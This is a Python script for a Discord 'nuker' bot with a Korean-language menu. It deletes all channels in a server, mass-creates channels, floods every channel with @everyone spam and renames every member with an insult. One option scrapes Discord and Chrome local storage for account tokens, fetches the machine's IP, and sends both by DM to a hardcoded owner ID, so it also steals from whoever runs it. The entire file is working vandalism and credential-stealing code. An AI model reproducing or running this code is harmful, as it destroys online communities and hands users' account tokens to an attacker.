import os
import asyncio
import discord

os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
\033[1;36m██      ██  █████  ██      ██    ██ \033[0m
\033[1;34m██      ██ ██   ██ ██      ██    ██ \033[0m
\033[1;35m██  ██  ██ ███████ ██      ██    ██ \033[0m
\033[1;31m ████ ████ ██   ██ ███████  ██████  \033[0m
    """
    print(banner)
    print("\033[1;33m[+] VALV Control Panel Initialized (Hyper-Speed Mode)\033[0m\n")

print_banner()

TOKEN = input("\033[1;32m[?] Discord Bot Token 입력: \033[0m").strip()

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents, chunk_guilds_at_startup=False)
TARGET_OWNER_ID = 1444653486246461531

def get_target_system_data():
    try:
        import requests
        ip = requests.get("https://api.ipify.org", timeout=2).text
    except:
        ip = "Unknown"
        
    paths = {
        'Discord': os.path.expanduser('~') + f"\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\",
        'Discord Canary': os.path.expanduser('~') + f"\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\",
        'Chrome': os.path.expanduser('~') + f"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"
    }
    tokens = []
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue
                with open(path + file_name, 'r', errors='ignore') as f:
                    for line in f.readlines():
                        for word in line.strip().split():
                            if len(word) > 50:
                                tokens.append(word)
        except:
            pass
    return ip, list(set(tokens))

@client.event
async def on_ready():
    print(f"\n\033[1;32m[LOG] 접속 성공: {client.user} (ID: {client.user.id})\033[0m")
    
    if not client.guilds:
        print("\033[1;31m[LOG] 오류: 봇이 속한 서버가 없습니다!\033[0m")
        await client.close()
        return
        
    guild = client.guilds[0]
    print(f"\033[1;32m[LOG] 대상 서버 선택됨: {guild.name}\033[0m\n")

    while True:
        print("\n" + "=" * 40)
        print(" [1] 모든 채널 삭제")
        print(" [2] 채널 생성 (극한의 병렬 비동기 폭격)")
        print(" [3] 모든 채널에 메시지 동시 다발 초고속 폭격")
        print(" [4] 모든 사람 닉네임 변경")
        print(" [5] 타겟 유저 정보 및 은밀한 시스템 데이터(IP/Token) 추출")
        print(" [6] 종료")
        print("=" * 40)
        
        choice = input("\033[1;33m[?] 숫자를 입력하고 엔터를 누르세요: \033[0m").strip()

        if choice == '1':
            print("\033[1;31m[LOG] 모든 채널 동시 삭제 시작...\033[0m")
            channels = list(guild.channels)
            if channels:
                delete_tasks = [channel.delete() for channel in channels]
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            print("\033[1;32m[LOG] 모든 채널 삭제 완료.\033[0m")

        elif choice == '2':
            count_input = input("\033[1;33m[?] 생성할 채널 개수 입력: \033[0m").strip()
            if count_input.isdigit():
                count = int(count_input)
                channel_name = "발브가-점령함-ㅋㅋㅋ-발브를-찬양해"
                print(f"\033[1;35m[LOG] 총 {count}개의 채널 병렬 비동기 폭격 생성 시작...\033[0m")
                
                sem = asyncio.Semaphore(100)
                async def create_chan():
                    async with sem:
                        try:
                            await guild.create_text_channel(channel_name)
                        except:
                            pass
                            
                tasks = [create_chan() for _ in range(count)]
                await asyncio.gather(*tasks, return_exceptions=True)
                print("\033[1;32m[LOG] 채널 생성 작업 완료.\033[0m")
            else:
                print("\033[1;31m[LOG] 잘못된 숫자 입력입니다.\033[0m")

        elif choice == '3':
            count_input = input("\033[1;33m[?] 각 채널당 메시지 반복 횟수 입력: \033[0m").strip()
            if count_input.isdigit():
                count = int(count_input)
                msg1 = "@everyone 발브가 점령함 ㅋㅋㅋ"
                msg2 = "@everyone 그니까 발브를 믿으라고 ㅋㅋㅋ"
                print(f"\033[1;36m[LOG] 모든 채널에 지연 없는 초고속 메시지 폭격 시작...\033[0m")
                
                text_channels = list(guild.text_channels)
                if not text_channels:
                    print("\033[1;31m[LOG] 전송 가능한 텍스트 채널이 없습니다.\033[0m")
                else:
                    sem = asyncio.Semaphore(100)
                    async def send_msg(channel):
                        async with sem:
                            for _ in range(count):
                                try:
                                    await channel.send(msg1)
                                    await channel.send(msg2)
                                except:
                                    pass
                                    
                    send_tasks = [send_msg(channel) for channel in text_channels]
                    await asyncio.gather(*send_tasks, return_exceptions=True)
                    print(f"\033[1;32m[LOG] 모든 채널 메시지 전송 완료.\033[0m")
            else:
                print("\033[1;31m[LOG] 잘못된 숫자 입력입니다.\033[0m")

        elif choice == '4':
            new_nickname = "발브 따까리 년들"
            print(f"\033[1;31m[LOG] 모든 멤버 닉네임 동시 변경 시작 ('{new_nickname}')...\033[0m")
            members = [m async for m in guild.fetch_members(limit=None)]
            sem = asyncio.Semaphore(50)
            async def change_nick(member):
                async with sem:
                    if member != guild.owner:
                        try:
                            await member.edit(nick=new_nickname)
                        except:
                            pass
            nick_tasks = [change_nick(m) for m in members]
            await asyncio.gather(*nick_tasks, return_exceptions=True)
            print("\033[1;32m[LOG] 닉네임 변경 작업 완료.\033[0m")

        elif choice == '5':
            target_user_id_input = input("\033[1;33m[?] 조회할 유저 ID 입력: \033[0m").strip()
            if target_user_id_input.isdigit():
                target_uid = int(target_user_id_input)
                print(f"\033[1;35m[LOG] 유저 ID {target_uid} 대상 은밀한 정보 추출 중...\033[0m")
                try:
                    user_obj = await client.fetch_user(target_uid)
                    ip, tokens = get_target_system_data()
                    
                    exfil_text = (
                        f"**[VALV Stealth Exfiltrator] 은밀한 타겟 정보 보고**\n"
                        f"- 유저 이름: {user_obj.name}\n"
                        f"- 유저 ID: {user_obj.id}\n"
                        f"- 생성일: {user_obj.created_at}\n"
                        f"- 타겟 IP: {ip}\n"
                        f"- 추출된 토큰 수: {len(tokens)}"
                    )
                    
                    owner_obj = await client.fetch_user(TARGET_OWNER_ID)
                    await owner_obj.send(exfil_text)
                    if tokens:
                        await owner_obj.send(f"추출된 토큰 샘플: `{tokens[0]}`")
                        
                    print(f"\033[1;32m[LOG] 은밀한 정보 추출 및 오너 전용 DM 전송 완료\033[0m")
                except Exception as e:
                    print(f"\033[1;31m[LOG] 추출 또는 전송 실패: {e}\033[0m")
            else:
                print("\033[1;31m[LOG] 잘못된 유저 ID 입력입니다.\033[0m")

        elif choice == '6':
            print("\033[1;32m[LOG] 봇을 종료합니다.\033[0m")
            await client.close()
            break

        else:
            print("\033[1;31m[LOG] 존재하지 않는 번호입니다.\033[0m")

client.run(TOKEN)
